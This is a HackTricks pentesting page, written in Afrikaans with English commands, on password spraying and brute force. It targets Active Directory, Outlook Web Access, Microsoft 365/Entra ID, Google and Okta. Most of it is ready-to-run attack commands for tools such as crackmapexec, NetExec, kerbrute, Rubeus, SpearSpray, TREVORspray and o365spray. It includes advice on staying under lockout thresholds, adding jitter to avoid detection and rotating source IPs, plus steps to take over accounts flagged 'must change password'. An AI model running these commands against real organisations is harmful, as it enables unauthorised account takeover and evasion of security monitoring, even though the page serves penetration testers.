# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sodra jy verskeie **geldige gebruikersname** gevind het, kan jy die **mees algemene wagwoorde** probeer (hou die wagwoordbeleid van die omgewing in gedagte) met elkeen van die ontdekte gebruikers.\
By **default** is die **minimum** **wagwoord** **lengte** **7**.

Lyste van algemene gebruikersname kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Let daarop dat jy **sekere rekeninge kan lockout as jy verskeie verkeerde wagwoorde probeer** (by default meer as 10).

### Kry wagwoordbeleid

As jy sommige gebruiker credentials het of 'n shell as 'n domain user het kan jy die **wagwoordbeleid kry met**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Uitbuiting vanaf Linux (of almal)

- Gebruik **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Gebruik **NetExec (CME successor)** vir geteikende, lae-geraas spraying oor SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Gebruik [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(jy kan die aantal pogings aandui om lockouts te vermy):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVEEL, SOMS WERK DIT NIE
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Met die `scanner/smb/smb_login` module van **Metasploit**:

![](<../../images/image (745).png>)

- Deur **rpcclient** te gebruik:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Van Windows

- Met [Rubeus](https://github.com/Zer1t0/Rubeus) weergawe met brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan gebruikers uit die domein by verstek genereer en dit sal die wagwoordbeleid van die domein kry en die aantal probeerslae daarvolgens beperk):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Met [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifiseer en neem oor "Password must change at next logon" rekeninge (SAMR)

'n Lae-geraas tegniek is om 'n goedaardige/leë wagwoord te spray en rekeninge vas te vang wat STATUS_PASSWORD_MUST_CHANGE terugstuur, wat aandui dat die wagwoord gedwing verval het en verander kan word sonder om die ou een te ken.

Werkvloei:
- Enumereer gebruikers (RID brute via SAMR) om die teikenlys te bou:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray 'n leë wagwoord en gaan voort op treffers om rekeninge vas te vang wat by die volgende aanmelding moet verander:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Vir elke treffer, verander die wagwoord oor SAMR met NetExec se module (geen ou wagwoord nodig wanneer "must change" gestel is):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasionele notas:
- Maak seker jou host se klok is gesinkroniseer met die DC voor Kerberos-gebaseerde operasies: `sudo ntpdate <dc_fqdn>`.
- ’n [+] sonder (Pwn3d!) in sommige modules (bv. RDP/WinRM) beteken die creds is geldig, maar die account het nie interaktiewe logon-regte nie.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying met LDAP-teikening en PSO-bewuste throttling (SpearSpray)

Kerberos pre-auth-gebaseerde spraying verminder geraas teenoor SMB/NTLM/LDAP bind-pogings en pas beter by AD lockout-beleide. SpearSpray kombineer LDAP-gedrewe teikening, ’n patroonenjin, en beleidsbewustheid (domain policy + PSOs + badPwdCount buffer) om presies en veilig te spray. Dit kan ook gekompromitteerde principals in Neo4j merk vir BloodHound pathing.

Kernidees:
- LDAP-gebruikerontdekking met paging en LDAPS support, opsioneel met custom LDAP filters.
- Domain lockout policy + PSO-aware filtering om ’n konfigureerbare pogingbuffer (threshold) te laat en te verhoed dat users gesluit word.
- Kerberos pre-auth validasie met vinnige gssapi bindings (genereer 4768/4771 op DCs in plaas van 4625).
- Patroon-gebaseerde, per-gebruiker password generation met veranderlikes soos names en temporale waardes afgelei van elke user se pwdLastSet.
- Throughput control met threads, jitter, en max requests per second.
- Opsionele Neo4j integrasie om owned users vir BloodHound te merk.

Basiese gebruik en ontdekking:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Teiken en patroonbeheer:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth en veiligheidskontroles:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound-verryking:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Oorsig van patroonstelsel (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Daar is verskeie tools vir p**assword spraying outlook**.

- Met [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- met [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Met [Ruler](https://github.com/sensepost/ruler) (betroubaar!)
- Met [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Met [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Om enige van hierdie tools te gebruik, benodig jy 'n gebruikerslys en 'n wagwoord / 'n klein lys wagwoorde om te spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Vir cloud spraying, identifiseer eers of die tenant **managed**, **federated**, of **hybrid** is, omdat die endpoint en die lockout-gedrag kan verskil van on-prem AD. In Microsoft Entra verander **Smart Lockout** hoe herhaalde raaiskote die lockout-budget verbruik:

- Om dieselfde **bad password** te herhaal, hou nie aan om die lockout-teller te verhoog nie, maar om **nuwe candidates** te probeer, doen dit wel.
- **Familiar** en **unfamiliar** liggings het **aparte** tellers.
- Tenants wat **pass-through authentication (PTA)** gebruik, kry nie voordeel van die bad-password hash tracking nie, so behandel hulle meer soos klassieke lockout-sensitiewe teikens.

In die praktyk, spray **een password per round**, hou genoeg spasiëring tussen rounds, en verkies tooling wat die tenant se werklike auth flow kan ontdek voor jy raaiskote stuur.

- Met [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), kan jy die tenant recon, die `token_endpoint` ontdek, `msol`/`adfs`/`owa`/`okta` spray, en verkeer deur verskeie egress IPs roteer:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Met [**Spray365**](https://github.com/MarkoH17/Spray365), kan jy vooraf ’n hervatbare **execution plan** bou, die auth-volgorde randomiseer, en ’n **minimum delay per user** afdwing om buite die lockout-venster te bly:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Met [**o365spray**](https://github.com/0xZDH/o365spray), kan jy die tenant valideer, gebruikers enumerate met modules soos `onedrive`, en spray via `oauth2` of `adfs` terwyl jy **een poging per gebruiker** per lockout window behou. As jy reeds ’n FireProx API het, gee dit deur met `--proxy-url` om die source IPs te versprei:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Onlangse operator tradecraft het ook verskuif na **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) ondersteun tydvensters, wagwoord-skommel, ADFS/M365 spraying, en outomatiese post-auth exfiltration. Onlangse werklike misbruik het ook **Microsoft Teams API** account enumeration en **AWS region rotation** gebruik om spray waves oor verskeie bron-geografieë te versprei.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
